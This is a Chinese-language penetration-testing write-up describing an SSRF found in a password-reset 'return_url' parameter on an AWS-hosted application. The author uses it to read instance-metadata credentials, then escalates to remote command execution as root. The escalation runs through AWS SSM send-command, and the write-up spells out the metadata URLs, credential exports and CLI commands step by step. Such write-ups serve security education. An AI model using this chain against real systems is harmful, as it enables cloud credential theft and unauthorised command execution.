看我如何从 AWS SSRF 到 RCE 的。

0x01 发现AWS SSRF TO RCE

我手动遍历应用程序查找一些敏感的 API ，同时将目标范围添加到 Burpsuite 中“抓取和审核”。在应用程序中有一个常见的“密码重置”功能。仔细观察，有一个参数“return_url”。这些参数大概率会产生一些安全问题。经过测试这个参数存在ssrf。

在检查不同的 HTTP 请求时，很明显该应用程序是通过 AWS 运行的，可以看到响应标头为 X-Amz-Cf-Id，并且还有一个用于获取个人资料照片的 S3 存储桶交互。

下一步很明显是检查是否存在 SSRF,我尝试访问 AWS 元数据 URL：

http://169.254.169.254/latest/meta-data/下面是对 CURL 请求的响应

从实例元数据中获取安全凭证——

这为我证实了 SSRF。进一步发现rce漏洞

AWS 提供了一项名为AWS System manager 的服务来管理在 AWS 云中运行的应用程序和基础设施，这些应用程序和基础设施也可以被命令行工具使用。参考 — https://docs.aws.amazon.com/cli/latest/reference/ssm/index.html

对我有利的一件事是为了通过 SSM 在实例中运行远程命令，它应该具有附加到实例的相关角色。

1.使用上述安全凭证安装和配置 AWS CLI。

$ export AWS_ACCESS_KEY_ID= $ export AWS_SECRET_ACCESS_KEY= $ export AWS_DEFAULT_REGION= $ export AWS_SESSION_TOKEN=

2. 以下命令可用于查找第一步中使用的区域 - http://169.254.169.254/latest/meta-data/placement/availability-zone

3.使用send-command来执行命令，查询看起来像这样-

$ aws ssm send-command --document-name "AWS-RunShellScript" --comment "AnyComment" --instance-ids="[Instance-id]" --parameters "commands=whoami"

此命令的输出提供了一个 CommandId

4.获取第3步中使用的实例ID- http://169.254.169.254/latest/meta-data/instance-id

5. 查看执行命令的输出的最后一步（如第 3 步“whoami”中所用）-

$ aws ssm list-command-invocations --command-id="[Command_Id]" --details
终于我能够执行命令了。可以看到输出为“root”！AWS SSRF 升级为 RCE 。
